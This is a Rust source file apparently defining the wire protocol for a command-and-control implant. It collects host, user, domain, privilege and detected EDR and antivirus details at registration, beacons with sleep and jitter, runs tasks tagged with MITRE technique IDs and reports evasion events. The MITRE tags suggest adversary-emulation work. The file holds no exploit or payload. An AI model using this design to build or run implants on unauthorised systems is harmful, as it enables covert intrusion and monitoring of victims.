use base64::{engine::general_purpose::STANDARD, Engine};
use serde::{Deserialize, Deserializer, Serialize, Serializer};

// ---------------------------------------------------------------------------
// Base64 serde helpers — Go's encoding/json uses base64 for []byte fields
// ---------------------------------------------------------------------------

mod b64 {
    use super::*;
    pub fn serialize<S: Serializer>(bytes: &[u8], s: S) -> Result<S::Ok, S::Error> {
        s.serialize_str(&STANDARD.encode(bytes))
    }
    pub fn deserialize<'de, D: Deserializer<'de>>(d: D) -> Result<Vec<u8>, D::Error> {
        let s = String::deserialize(d)?;
        STANDARD.decode(&s).map_err(serde::de::Error::custom)
    }
}

mod b64_opt {
    use super::*;
    pub fn serialize<S: Serializer>(v: &Option<Vec<u8>>, s: S) -> Result<S::Ok, S::Error> {
        match v {
            Some(b) => s.serialize_some(&STANDARD.encode(b)),
            None    => s.serialize_none(),
        }
    }
    pub fn deserialize<'de, D: Deserializer<'de>>(d: D) -> Result<Option<Vec<u8>>, D::Error> {
        Option::<String>::deserialize(d)?
            .map(|s| STANDARD.decode(&s).map_err(serde::de::Error::custom))
            .transpose()
    }
}

// ---------------------------------------------------------------------------
// Outbound (agent → server)
// ---------------------------------------------------------------------------

#[derive(Serialize)]
pub struct RegisterRequest {
    pub build_id:     String,
    pub campaign_id:  String,
    pub hostname:     String,
    pub username:     String,
    pub domain:       String,
    pub ip_internal:  String,
    pub os:           String,
    pub arch:         String,
    pub os_version:   String,
    pub is_elevated:  bool,
    pub process_name: String,
    pub pid:          i32,
    pub edr_detected: Vec<String>,
    pub av_detected:  Vec<String>,
    #[serde(with = "b64")]
    pub pubkey:       Vec<u8>,
}

#[derive(Serialize)]
pub struct TaskOutputRequest {
    pub session_id:          String,
    pub task_id:             String,
    #[serde(with = "b64")]
    pub output:              Vec<u8>,
    pub success:             bool,
    pub evasion_event:       bool,
    pub evasion_description: String,
}

// ---------------------------------------------------------------------------
// Inbound (server → agent)
// ---------------------------------------------------------------------------

#[derive(Deserialize)]
pub struct RegisterResponse {
    pub session_id:    String,
    #[serde(with = "b64")]
    pub server_pubkey: Vec<u8>,
    pub sleep_seconds: u64,
    pub jitter_pct:    u64,
}

#[derive(Deserialize)]
pub struct PollResponse {
    pub tasks:         Vec<Task>,
    pub sleep_seconds: u64,
    pub jitter_pct:    u64,
    pub kill:          bool,
}

#[derive(Deserialize, Clone)]
pub struct Task {
    pub id:                 String,
    #[serde(rename = "type")]
    pub task_type:          String,
    #[serde(default, with = "b64_opt")]
    pub args:               Option<Vec<u8>>,
    pub mitre_technique_id: Option<String>,
}

// Task execution result — returned from executor::run()
pub struct TaskOutput {
    pub data:                Vec<u8>,
    pub success:             bool,
    pub evasion_detected:    bool,
    pub evasion_description: Option<String>,
}

impl TaskOutput {
    pub fn success(data: Vec<u8>) -> Self {
        Self { data, success: true, evasion_detected: false, evasion_description: None }
    }

    pub fn failure(msg: &str) -> Self {
        Self {
            data:                msg.as_bytes().to_vec(),
            success:             false,
            evasion_detected:    false,
            evasion_description: None,
        }
    }

    pub fn evasion(description: String) -> Self {
        Self {
            data:                vec![],
            success:             false,
            evasion_detected:    true,
            evasion_description: Some(description),
        }
    }
}
